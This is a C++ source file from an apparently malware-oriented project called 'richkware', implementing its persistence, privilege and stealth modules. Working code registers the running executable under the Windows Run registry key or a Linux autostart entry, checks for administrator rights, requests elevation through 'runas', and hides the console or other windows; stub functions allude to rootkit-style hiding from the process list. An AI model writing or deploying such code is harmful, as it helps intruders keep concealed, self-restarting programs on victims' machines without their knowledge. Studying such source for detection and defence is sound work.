#include "richkware/system/persistence.hpp"
#include <iostream>
#include <fstream>

#ifdef _WIN32
#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#else
#include <unistd.h>
#include <sys/stat.h>
#include <pwd.h>
#endif

namespace richkware::system {

// PersistenceManagerImpl implementation
class PersistenceManagerImpl::Impl {
public:
    std::string app_name_;

    explicit Impl(std::string app_name) : app_name_(std::move(app_name)) {}
    
    core::Result<void> install_registry_persistence(const std::filesystem::path& executable_path) {
#ifdef _WIN32
        HKEY hKey;
        const char* subkey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        
        if (RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
            return core::RichkwareError{core::ErrorCode::SystemError, "Failed to open registry key"};
        }
        
        std::string exe_path = executable_path.string();
        if (RegSetValueEx(hKey, app_name_.c_str(), 0, REG_SZ, 
                         (const BYTE*)exe_path.c_str(), exe_path.length() + 1) != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return core::RichkwareError{core::ErrorCode::SystemError, "Failed to set registry value"};
        }
        
        RegCloseKey(hKey);
        return core::Result<void>{};
#else
        // Linux: create autostart entry
        const char* home = getenv("HOME");
        if (!home) {
            return core::RichkwareError{core::ErrorCode::SystemError, "HOME not set"};
        }
        
        std::string autostart_dir = std::string(home) + "/.config/autostart";
        std::filesystem::create_directories(autostart_dir);
        
        std::string desktop_file = autostart_dir + "/" + app_name_ + ".desktop";
        std::ofstream file(desktop_file);
        
        if (!file.is_open()) {
            return core::RichkwareError{core::ErrorCode::SystemError, "Failed to create autostart file"};
        }
        
        file << "[Desktop Entry]\n";
        file << "Type=Application\n";
        file << "Name=" << app_name_ << "\n";
        file << "Exec=" << executable_path.string() << "\n";
        file << "Hidden=false\n";
        file << "NoDisplay=false\n";
        file << "X-GNOME-Autostart-enabled=true\n";
        
        file.close();
        return core::Result<void>{};
#endif
    }
    
    core::Result<void> remove_registry_persistence() {
#ifdef _WIN32
        HKEY hKey;
        const char* subkey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        
        if (RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
            return core::RichkwareError{core::ErrorCode::SystemError, "Failed to open registry key"};
        }
        
        RegDeleteValue(hKey, app_name_.c_str());
        RegCloseKey(hKey);
        return core::Result<void>{};
#else
        const char* home = getenv("HOME");
        if (!home) {
            return core::RichkwareError{core::ErrorCode::SystemError, "HOME not set"};
        }
        
        std::string desktop_file = std::string(home) + "/.config/autostart/" + app_name_ + ".desktop";
        std::filesystem::remove(desktop_file);
        return core::Result<void>{};
#endif
    }
    
    bool check_registry_persistence() const {
#ifdef _WIN32
        HKEY hKey;
        const char* subkey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        
        if (RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
            return false;
        }
        
        DWORD type, size = 0;
        bool exists = (RegQueryValueEx(hKey, app_name_.c_str(), NULL, &type, NULL, &size) == ERROR_SUCCESS);
        
        RegCloseKey(hKey);
        return exists;
#else
        const char* home = getenv("HOME");
        if (!home) return false;
        
        std::string desktop_file = std::string(home) + "/.config/autostart/" + app_name_ + ".desktop";
        return std::filesystem::exists(desktop_file);
#endif
    }
};

PersistenceManagerImpl::PersistenceManagerImpl(std::string app_name) : pimpl_(std::make_unique<Impl>(std::move(app_name))) {}
PersistenceManagerImpl::~PersistenceManagerImpl() = default;

core::Result<void> PersistenceManagerImpl::install(PersistenceMethod method,
                                                     const std::filesystem::path& executable_path) {
    switch (method) {
        case PersistenceMethod::Registry:
        case PersistenceMethod::Autostart:
            return pimpl_->install_registry_persistence(executable_path);
        default:
            return core::RichkwareError{core::ErrorCode::SystemError, "Persistence method not implemented"};
    }
}

core::Result<void> PersistenceManagerImpl::remove(PersistenceMethod method) {
    switch (method) {
        case PersistenceMethod::Registry:
        case PersistenceMethod::Autostart:
            return pimpl_->remove_registry_persistence();
        default:
            return core::RichkwareError{core::ErrorCode::SystemError, "Persistence method not implemented"};
    }
}

bool PersistenceManagerImpl::is_installed(PersistenceMethod method) const {
    switch (method) {
        case PersistenceMethod::Registry:
        case PersistenceMethod::Autostart:
            return pimpl_->check_registry_persistence();
        default:
            return false;
    }
}

std::vector<PersistenceMethod> PersistenceManagerImpl::supported_methods() const {
    return {PersistenceMethod::Registry, PersistenceMethod::Autostart};
}

// PrivilegeManager implementation
class PrivilegeManager::Impl {
public:
    PrivilegeLevel get_current_level() const {
#ifdef _WIN32
        BOOL isAdmin = FALSE;
        PSID adminGroup = NULL;
        
        SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
        if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                   DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
            CheckTokenMembership(NULL, adminGroup, &isAdmin);
            FreeSid(adminGroup);
        }
        
        return isAdmin ? PrivilegeLevel::Administrator : PrivilegeLevel::User;
#else
        return (getuid() == 0) ? PrivilegeLevel::Administrator : PrivilegeLevel::User;
#endif
    }
    
    core::Result<void> request_elevation(const std::filesystem::path& executable_path) const {
#ifdef _WIN32
        SHELLEXECUTEINFO sei = {sizeof(sei)};
        sei.lpVerb = "runas";
        sei.lpFile = executable_path.string().c_str();
        sei.hwnd = NULL;
        sei.nShow = SW_NORMAL;

        if (!ShellExecuteEx(&sei)) {
            return core::RichkwareError{core::ErrorCode::SystemError, "Failed to request elevation"};
        }

        return core::Result<void>{};
#else
        // On Linux, would need sudo or similar
        (void)executable_path; // Suppress unused parameter warning
        return core::RichkwareError{core::ErrorCode::SystemError, "Elevation not implemented on Linux"};
#endif
    }
};

PrivilegeManager::PrivilegeManager() : pimpl_(std::make_unique<Impl>()) {}
PrivilegeManager::~PrivilegeManager() = default;

PrivilegeLevel PrivilegeManager::current_level() const {
    return pimpl_->get_current_level();
}

bool PrivilegeManager::is_administrator() const {
    return current_level() == PrivilegeLevel::Administrator;
}

core::Result<void> PrivilegeManager::request_elevation(const std::filesystem::path& executable_path) const {
    return pimpl_->request_elevation(executable_path);
}

core::Result<void> PrivilegeManager::enable_privilege(const std::string&) {
    // Placeholder
    return core::Result<void>{};
}

core::Result<void> PrivilegeManager::disable_privilege(const std::string&) {
    // Placeholder
    return core::Result<void>{};
}

// StealthManager implementation
class StealthManager::Impl {
public:
    core::Result<void> hide_console() {
#ifdef _WIN32
        HWND console = GetConsoleWindow();
        if (console) {
            ShowWindow(console, SW_HIDE);
        }
        return core::Result<void>{};
#elif defined(__linux__)
        // On Linux, detach from terminal
        if (daemon(0, 0) == -1) {
            return core::RichkwareError{core::ErrorCode::SystemError, "Failed to daemonize"};
        }
        return core::Result<void>{};
#else
        return core::RichkwareError{core::ErrorCode::SystemError, "Console hiding not supported on this platform"};
#endif
    }
    
    core::Result<void> show_console() {
#ifdef _WIN32
        HWND console = GetConsoleWindow();
        if (console) {
            ShowWindow(console, SW_SHOW);
        }
        return core::Result<void>{};
#else
        // Cannot un-daemonize
        return core::RichkwareError{core::ErrorCode::SystemError, "Cannot show console after daemonizing"};
#endif
    }
    
    core::Result<void> hide_window(const std::string& window_title) {
#ifdef _WIN32
        HWND hwnd = FindWindow(NULL, window_title.c_str());
        if (hwnd) {
            ShowWindow(hwnd, SW_HIDE);
            return core::Result<void>{};
        }
        return core::RichkwareError{core::ErrorCode::SystemError, "Window not found"};
#else
        // Linux window hiding would require X11 or Wayland APIs
        (void)window_title; // Suppress unused parameter warning
        return core::RichkwareError{core::ErrorCode::SystemError, "Window hiding not implemented on Linux"};
#endif
    }
};

StealthManager::StealthManager() : pimpl_(std::make_unique<Impl>()) {}
StealthManager::~StealthManager() = default;

core::Result<void> StealthManager::hide_console() {
    return pimpl_->hide_console();
}

core::Result<void> StealthManager::show_console() {
    return pimpl_->show_console();
}

core::Result<void> StealthManager::hide_window(const std::string& window_title) {
    return pimpl_->hide_window(window_title);
}

core::Result<void> StealthManager::set_critical_process(bool) {
    // Placeholder - would require kernel-level access
    return core::Result<void>{};
}

core::Result<void> StealthManager::hide_from_process_list() {
    // Placeholder - would require rootkit techniques
    return core::Result<void>{};
}

core::Result<void> StealthManager::unhide_from_process_list() {
    // Placeholder
    return core::Result<void>{};
}

// PersistenceManager implementation
class PersistenceManager::Impl {
public:
    std::string app_name_;
    std::unique_ptr<PersistenceManagerImpl> persistence_impl_;
    std::unique_ptr<PrivilegeManager> privilege_manager_;
    std::unique_ptr<StealthManager> stealth_manager_;

    Impl(std::string app_name) : app_name_(std::move(app_name)) {
        persistence_impl_ = std::make_unique<PersistenceManagerImpl>(app_name_);
        privilege_manager_ = std::make_unique<PrivilegeManager>();
        stealth_manager_ = std::make_unique<StealthManager>();
    }
};

PersistenceManager::PersistenceManager(std::string app_name) 
    : pimpl_(std::make_unique<Impl>(std::move(app_name))) {}

PersistenceManager::~PersistenceManager() = default;

core::Result<void> PersistenceManager::initialize() {
    return core::Result<void>{};
}

core::Result<void> PersistenceManager::install_persistence() {
    // Get current executable path
    std::filesystem::path exe_path;
    
#ifdef _WIN32
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    exe_path = path;
#else
    char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len != -1) {
        path[len] = '\0';
        exe_path = path;
    }
#endif
    
    return pimpl_->persistence_impl_->install(PersistenceMethod::Registry, exe_path);
}

core::Result<void> PersistenceManager::remove_persistence() {
    return pimpl_->persistence_impl_->remove(PersistenceMethod::Registry);
}

bool PersistenceManager::has_persistence() const {
    return pimpl_->persistence_impl_->is_installed(PersistenceMethod::Registry);
}

PrivilegeManager& PersistenceManager::privileges() noexcept {
    return *pimpl_->privilege_manager_;
}

StealthManager& PersistenceManager::stealth() noexcept {
    return *pimpl_->stealth_manager_;
}

} // namespace richkware::system